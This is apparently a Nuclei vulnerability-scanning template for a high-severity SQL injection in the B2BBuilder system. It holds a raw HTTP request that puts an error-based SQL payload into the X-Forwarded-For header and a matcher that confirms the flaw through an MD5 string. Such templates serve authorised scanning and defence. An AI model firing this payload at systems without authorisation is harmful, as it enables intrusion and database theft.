id: B2BBuilder-sqli
info:
  author: Str1am
  name: "B2BBuilder \u7CFB\u7EDFX-Forwarded-For SQL\u6CE8\u5165\u6F0F\u6D1E"
  severity: high
  tags: B2BBuilder,sqli
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - 4beed3b9c4a886067de0e3a094246f781
  matchers-condition: and
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: 1.1.1.1'',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x
    from information_schema.tables group by x)a),1,1)#

    '
